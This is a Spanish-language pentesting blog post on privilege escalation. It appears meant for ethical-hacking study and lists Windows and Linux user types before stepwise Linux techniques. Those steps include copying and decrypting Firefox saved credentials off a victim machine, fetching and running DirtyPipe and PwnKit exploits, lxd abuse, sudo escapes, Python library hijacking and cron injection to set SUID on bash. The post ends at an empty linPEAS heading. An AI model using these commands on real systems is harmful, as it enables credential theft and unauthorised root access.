---
layout: single
title: Escalada de privilegios.
excerpt: "Son técnicas para acceder a la información o privilegios que tiene un usuario dentro de un sistema"
date: 2022-11-30
classes: wide
header:
  teaser: /assets/images/pe1.jpeg
  teaser_home_page: true
categories:
- Pentesting
- Ethical Hacking 
tags:
- Privilegios
- Windows
- Linux
---

## Usuarios en Windows.<br>
- Invitado (Guest): Puede usar el equipo pero no modificar nada dentro de el.<br>
- Standard: Usuario con capacidad de modificar algunas configuraciones del sistema siempre y cuando solo afecten al mismo usuario.<br>
- Administrator: Usuario con capacidad de modificar el sistema, desactivar el antivirus, instalar herramientas de forma global o acceder a la información de otros usuarios dentro del mismo sistema.<br>
- NT Authority\System: Usuario del sistema que ejecuta las tareas y servicios del sistema operativo.<br>
Con el comando net users puedes ver los usuarios existentes en el sistema.<br><br>

## Usuarios en Linux.<br>
- Service user: Usuario que ejecuta los servicio del sistema como montar un servicio http para mostrar un sitio web en un servidor. Los privilegios de este usuario se limitan al servicio que esté ejecutando.<br>
- Standard: Usuario normal para usar el sistema.<br>
- Root: Usuario que tiene control total del sistema.<br>
Para saber ver los usuarios existentes en el sistema basta con abrir el /etc/passwd.<br><br>

## Usuarios en aplicaciones web.<br>
- Administrador.<br>
- Editor.<br>
- Standard.<br>
- Otros.<br><br>

## Técnica de escalada de privilegios horizontal.<br>
Es accesar a la información de otros usuarios pero con los mismos privilegios que tiene el usuario con el cual ganaste acceso al sistema.<br>

## Técnica de escalda de privilegios vertical.<br>
Es acceder a un usuario que tenga mas control dentro del sistema para realizar modificaciones.<br><br>

![](/assets/images/pe.jpeg) 

## ESCALADA DE PRIVILEGIOS EN LINUX.<br>
## ls -la
Con el commando ls -la puedes ver las carpetas ocultas, el propietario y que privilegios tienen asignadas los directorio.<br> Debido a que en firefox se almacenan sesiones se puede llegar a listar las credenciales y obtenerlas en texto claro con una herramienta que permita hacer un decrypt en caso de que este el directorio ./mozilla/firefox.<br>
Ingresas al directorio .mozilla/firefox y ve si estan los archivos key.db y login.json dentro de cualquier archivo pero con extensión .default.<br>
Haz un cat a login.json y si está el archivo user.encryp y password.encryp significa que hay una sesión activa y puedes llegar a computar las credenciales.<br>
Clona la siguiente herramienta que te permitirá ver las credenciales.<br>
git clone https://github.com/unode/firefox_decrypt <br>
```
ls -la -> ./mozilla/firefox
cd ./mozilla/firefox
ls -> key.db	login.json
cat login.json -> user.encryp	password.encryp
git clone https://github.com/unode/firefox_decrypt
```

Desde la maquina víctima ver si tiene instalado python3 para poder compartirte un servicio http por el puerto 8000 para que no te pida credenciales al momento de compartirlo.<br>
Copia de forma recursiva todos los recursos que haya dentro del directorio ./mozilla/firefox a tu maquina con wget.<br>
```
which python3 -> /usr/bin/pyhton3
python3 -m http.server 8000
wget -r <ip-address>:8000
```
Correr el script en python e indicale la ruta de donde hará el decryp.
```
python3 firefox_decryp.py /ejemplo/directorio/copiado
```
<br>
## DirtyPipe.
CVE-2022-0847 -> Es una vulnerabilidad que que consiste en cambiar la contraseña del usuario root sobrescribiendo el /etc/passwd.<br> Para ver si un sistema operativo es vulnerable al DirtyPipe lo que se tiene que hacer es ver si tiene instalado el binario gcc. Posteriormente desplazarse a una carpeta que tenga permisos de escritura para poder descargar el exploit(Por lo regular el directorio /tmp siempre cuenta con permisos de escritura). En caso de que la maquina no tenga acceso a internet te puedes copiar el exploit a la clipboard y despues pegarlo en un archivo.c. Por consiguiente buscar en github el exploit referente a la vulnerabilidad, compilar el exploit y al ejecutarlo te lanzará una consola como el usuario root.<br>
```
which gcc -> /usr/bin/gcc

cd /tmp

which wget -> /usr/bin/wget			# Para descargar el exploit a la maquina victima.
wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c

cat exploit.c | xargs | xclip -sel clip 	# Copiar el exploit.c a la clipboard.
nano exploit.c 					# Crear un archivo.c para pegar el exploit copiardo de la clipboard

gcc exploit.c -o exploit 			# Compilar el exploit.c y explortarlo al archivo con nombre exploit

./exploit					# Ejecutar el exploit
```
<br>
## id.
Ver a que grupos pertece el usuario actual. En caso de que este dentro del grupo lxd o docker tienes una vía potencial para escalar privilegios en caso de que no este sanitizado.<br>
Explotación del grupo lxd.
- Lo primero que se tiene que hacer es buscar con searchsploit un script que te ayude a explotar la vulnerabilidad del lxd. 
- Despues copias el exploit a la ruta actual de trabajo.
- Mueves el exploit a un archivo con nombre descriptivo con la misma extensión(exploitlxd.sh), abres el exploit, eliminas la linea 22 y añades la siguiente linea -> lxc image list y lo guardas.
- Te descargas el lxd alpine builder como completmento para la explotación. 
- Ejecutas el siguiente comando como el usuario root sudo bash build-alphine.
- Te compartes un servicio http por el puerto 80 para traladar el exploit y el alpine.tar.gz a la maquina víctima.
- Ingresas a un directorio que tenga capacidad de escritura para no tener problemas al traladar el exploitlxd.sh y con wget te tranfieres el exploitlxd.sh y el alpine.tar.gz 
- Le asignas permisos de ejecución al exploitlxd.sh, lo ejecutas y obtendras una consola como el usuario root.


```
searchsploit lxd -> linux/local/46978.sh
searchsploit -m linux/local/46978.sh .
mv 46978.sh exploit_lxd.sh && nvim exploit_lxd.sh
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
sudo bash build-alpine
sudo python3 -m http.server 80

cd /tmp 
wget http://<tu-ip-address>/exploitlxd.sh
wget http://<tu-ip-address>/alpine-v3.16-x86_64-20220817_1533.tar.gz
chmod +x exploitlxd.sh
./exploitlxd.sh
```
<br>
## su root.
En caso de que tengas contraseñas puedes reutilizarlas con este comando y si son las correctas puedes convertirte en superusuario.
```
su root
```
<br>
## sudo -l.
Ver si hay binarios que se puedan ejecutar como el usuario root sin proporcionar la contraseña. En caso de encontrar un binario con este comando puedes apoyarte de el sitio web GTFOBins el cual te muestra como puedes llegar a escalar privilegios por medio de un binario.
```
sudo -l -> /usr/bin/knife
sudo knife exec -E 'exec "/bin/bash"'	# Con este linea te lanzas una consola como el usuario root.
```
Si al ejecutar el sudo -l vez que el usuario actual tiene todos los privilegios asignados para ejecutar cualquier cosa dentro del sistema, puedes hacer un bash -p para convertirte en root.
```
sudo -l -> ALL/ALL
bash -p 
```
<br>
## Library Hijacking.
Consiste en suplantar una librería de python que un script.py importe al ejecutarse.<br>
¿Como se realiza esta técnica? Lo primero que tendras que hacer es identificar un script.py que se ejecute en el sistema, abres el script.py y revisas que librerías esta importando el script.py.<br> Una vez que hallaz identificado las librerías que se importan lo que vas a hacer es crear un script.py pero con el nombre de una de las librerías que importa el script. Dentro de la librería que acabas de crear vas a añadir código malicioso que te permita cambiar los privilegios de la bash. Lo que hace el script.py al ejecutarse es que al importar las librerías sigue un orden que depende del path(secuencia de directorios que se recorren para llegar a un archivo). Por lo regular parte de la ruta actual donde se sitúa y de allí recorre los demas directorios en busca de las librerías.<br>
Entonces si creas una archivo con el nombre de una librería que importe el script.py tomará está primero debido a que esta situada en el mismo lugar que el script.py y esta librería hará lo que tu le indiques dentro del script.<br>
Ej; La librería que se importa en el script.py es hashlib. Lo que haces es crear un archivo hashlib.py que invoque al sistema operativo para cambiarle los privilegios a la bash SUID(Set Uses ID). Ejecutamos el script indicando como usuario a root seguido de la ruta en la cual se encuentra el script.py.<br>
- Los permisos SUID son permisos especiales que se le asignan a archivos o aplicaciones que al momento de ejecutarse se ejecutan como el usuario propietario y no como el usuario que lo ejecuta.<br>

Haces un bash -p y te conviertes el el usuario root.
```
nvim hashlib.py -> import os 
		   os.system('chmod u+s "/bin/bash"') 	# Tambien se puede asignar sl permiso SUID asi chmod 4755 /bin/bash 

sudo -u root /usr/bin/python /home/<username>/script.py
bash -p
```
<br>
## cat /etc/crontab | crontab -l.
Con este comando puedes ver las tareas cron programadas en el sistema y posteriormente aprovecharte de una de ellas para injectar código malicioso. <br>
Las tareas cron por lo regular llegar a ser scripts relacionados con correos, bases de datos o comprobación de rutinas programadas con presición para que se ejecuten en una determinada fecha y hora.<br>
Uno como atacante puede ver las que tareas estan por ejecutarse y modificarlas agregando una linea que en el script que al ejecutarse le cambie los permisos a la bash por SUID.
```
chmod u+s /bin/bash
chmod 4755 /bin/bash
watch -c 1 /bin/bash 	# Comando para monitorizar el cambio de permisos en la bash
```
<br>
## find \\-perm -4000 -user root -ls 2>/dev/null.
Listar aquellos binarios SUID de los cuales el proprietario sea el usuario root y los errores los rediriges al stderr para no verlos en pantalla.<br>
- ./usr/bin/pkexec (CVE-2021-4034).<br>Con este binario puedes llegar a escalar privilegios con la herramienta pwnkit que se encuentra en github.<br>Lo primero que se tiene que hacer es ver si la maquina víctima cuenta con wget y make. Posteriormente clonas te repositorio de github y lo descomprimes.<br>Desde tu maquina de atacante te compartes un servicio HTTP por el puerto 80 para transferir el pwnkit. Por ultimo te transfieres el pwnkit, ingresas en el, haces un make y lo ejecutas. Al ejecutarlo ganas acceso al sistema como el usuario root.


```
which wget && which make -> /usr/bin/wget 
			    /usr/bin/make
git clone https://github.com/berdav/CVE-2021-4034 
mv CVE-2021-4034.zip pwnkit.zip && zip -r pwnkit.zip pwnkit
sudo python3 -m http.server 80

wget http://<ip-address>/pwnkit
cd pwnkit && make && ./pwnkit
```
- ./usr/local/bin/backup.<br>Ver el propietario y el grupo al cual pertenece el binario backup. En caso de que el binario pertenezca a otros grupos puedes verificar que usuario esta en ese grupo para poder ejecutar el binario.<br>


```
ls -la ./usr/local/bin/backup -> -rwsr-xr-- 1 root admin 16484 Sep  3  2017 ./usr/local/bin/backup
# En este caso el propietario es root y el grupo al que pertenece es admin, lo siguiente es ver que usuarios estan en ese
grupo para poderlo ejecutar.

groups <username> # Con este comando puedes ver los grupos a los cuales pertenece un usuario.
```
<br>
## systemctl list-times.
Ver las tareas que estan a punto de ejecutarse 
<br>
## getcap -r / 2>/dev/null.
Listar las capabilities a nivel de sistema de forma recursiva y los errores redirigirlos al stderr para no verlos en pantalla.
<br>
## ps -faux | ps -e command.
Listar los procesos que se estan ejecutando.
<br>
## find / -writable -ls 2>/dev/null.
Listar aquellos archivos que tengan capacidad de escritura para despues injectarles código malicioso.
<br>
## linPEAS.sh.














